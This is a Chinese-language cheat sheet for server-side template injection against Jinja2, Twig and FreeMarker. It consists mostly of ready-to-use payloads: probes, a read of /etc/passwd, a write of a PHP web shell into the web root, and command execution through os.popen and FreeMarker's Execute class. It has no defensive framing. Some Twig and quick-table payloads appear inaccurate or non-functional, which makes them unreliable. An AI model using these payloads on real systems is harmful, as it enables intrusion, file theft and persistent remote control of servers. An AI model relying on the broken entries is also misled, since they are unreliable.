# SSTI攻击链

## Jinja2 → RCE

### 1. 探测SSTI

```
{{7*7}}
{{config}}
```

### 2. 获取配置

```
{{config}}
{{request}}
```

### 3. 读取文件

```
{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}
```

### 4. 写文件

```
{{''.__class__.__mro__[2].__subclasses__()[40]('/var/www/html/shell.php','w').write('<?php system($_GET["cmd"]);?>')}}
```

### 5. 命令执行

```
{{self.__class__.__mro__[2].__subclasses__()[40].__init__.__globals__['os'].popen('whoami').read()}}
```

---

## Twig → RCE

### 1. 探测

```
{{7*7}}
```

### 2. 命令执行

```
{{_self.env.getLoader().getTemplate('test').render()}}
{{_self.env.display.block_name}}
```

---

## 攻击链速查

| 模板 | 探测 | RCE |
|------|------|-----|
| Jinja2 | `{{7*7}}` | `{{__import__('os').popen('id').read()}}` |
| Twig | `{{7*7}}` | `{{_self.env.display.block_name}}` |
| FreeMarker | `${7*7}` | `${"freemarker.template.utility.Execute"?new()("id")}` |
